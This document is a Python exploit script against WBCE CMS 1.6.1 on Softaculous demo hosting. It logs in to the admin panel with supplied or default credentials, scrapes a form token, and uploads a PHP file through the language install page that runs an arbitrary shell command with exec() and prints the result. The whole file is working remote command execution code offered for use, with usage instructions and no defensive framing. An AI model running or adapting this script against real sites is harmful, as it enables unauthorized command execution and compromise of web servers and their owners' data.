"""
SoftaculousExploit.py

This script exploits the Softaculous vulnerability and tested on WBCE CMS 1.6.1.

Author: tmrswrr
Date: 12/01/2023

Usage:
python3 SoftaculousExploit.py [admin_link] [username] [password] [command]
Default credential: admin:password

Example:
python3 SoftaculousExploit.py https://example.com/admin admin password 'ls -la'

Dependencies:
- requests
- BeautifulSoup

"""

import sys
from dataclasses import dataclass
from urllib.parse import urlparse
import requests
from bs4 import BeautifulSoup

@dataclass
class SimpleUser:
    """Data class representing a simple user."""
    username: str
    password: str

class SoftaculousExploit:
    """
    Class for exploiting the Softaculous vulnerability.

    Attributes:
        session (requests.Session): The HTTP session.
        admin_url (str): The admin page URL.
    """
    def __init__(self, admin_page_url):
        """
        Initialize SoftaculousExploit.

        Args:
            admin_page_url (str): The admin page URL.
        """
        self.session = requests.Session()
        self.admin_url = admin_page_url

    def parse_url(self, url) -> str:
        """
        Parse the URL and extract the base path.

        Args:
            url (str): The URL to be parsed.

        Returns:
            str: The base path of the URL.
        """

        parsed_url = urlparse(url)
        base_path = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path.rstrip("/admin")
        return base_path

    def login(self, user: SimpleUser) -> bool:
        """
        Log in a user and check if the login is successful.

        Args:
            user (SimpleUser): The user to log in.

        Returns:
            bool: True if login is successful, False otherwise.
        """
        login_url = f"{self.admin_url}/login/index.php"
        login_payload = {
            "username": user.username,
            "password": user.password
        }
        login_headers = self.get_default_headers()

        login_response = self.session.post(login_url, data=login_payload, headers=login_headers)

        valid_login_text = "You are currently logged in as"

        if login_response.ok and valid_login_text in login_response.text:
            return True
        return False

    def perform_request(self, request_command):
        """
        Perform a request to exploit the Softaculous vulnerability.

        Args:
            request_command (str): The command to execute.

        Returns:
            None
        """
        index_request = self.session.get(f"{self.admin_url}/languages/index.php")
        index_content = index_request.text
        soup = BeautifulSoup(index_content, 'html.parser')

        formtoken_value = self.extract_formtoken(soup)

        install_payload = {
            "formtoken": formtoken_value,
            "submit": "Install",
        }

        files = {'userfile': ('upgrade.php', f"<?php echo exec('{request_command}'); ?>", 'application/x-php')}
        install_headers = self.get_default_headers()
        install_headers["Referer"] = f"{self.admin_url}/languages/index.php"
        install_headers = self.delete_unused_key_pair(install_headers)

        install_url = f"{self.admin_url}/languages/install.php"
        install_response = self.session.post(install_url, data=install_payload, files=files, headers=install_headers,
                                             allow_redirects=True)

        response = self.extract_response(install_response)
        print(response)

    def extract_formtoken(self, soup) -> str:
        """
        Extract the form token from the HTML soup.

        Args:
            soup (BeautifulSoup): The HTML soup.

        Returns:
            str: The value of the form token.
        """
        form = soup.find('form')
        formtoken_value = form.find('input', {'name': 'formtoken'}).get('value')
        return formtoken_value

    def extract_response(self, install_response) -> str:
        """
        Extract the response content from the install response.

        Args:
            install_response (requests.Response): The install response.

        Returns:
            str: The extracted response content.
        """

        install_soup = BeautifulSoup(install_response.content, "html.parser")
        response = install_soup.find('td', {"class": "content"}).next_element.strip()
        return response

    def delete_unused_key_pair(self, headers) -> dict:
        """
        Delete unused key-value pairs from headers.

        Args:
            headers (dict): The headers dictionary.

        Returns:
            dict: The headers dictionary with unused key-value pairs removed.
        """

        del headers["Sec-Fetch-Dest"]
        del headers["Sec-Fetch-Mode"]
        del headers["Sec-Fetch-Site"]
        del headers["Accept"]
        del headers["Content-Type"]
        return headers

    def get_default_headers(self):
        """
        Get the default headers.

        Returns:
            dict: The default headers.
        """
        return {
            "Host": "demos6.softaculous.com",
            "Origin": "https://demos6.softaculous.com",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
                          "Version/17.1 Safari/605.1.15"
        }

if __name__ == "__main__":
    if len(sys.argv) > 4:
        ADMIN_URL = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        command = sys.argv[4]

        exploit = SoftaculousExploit(ADMIN_URL)
        demo_user = SimpleUser(username, password)
        LOG_IN = exploit.login(demo_user)

        if LOG_IN:
            print("\n[+] SUCCESS - Logged-in")
            exploit.perform_request(command)
        else:
            print("[!] Can't login login. Please check Admin Panel link.")
    else:
        print(f"""
Go to this site: https://softaculous.com/demos/wbce_cms
Copy the Admin Panel link: (e.g..(https://demos6.softaculous.com/WBCE_CMS893tirrm50/admin))
\n[*] Usage: python3 {sys.argv[0]} [username] [password] [link] [command]""")
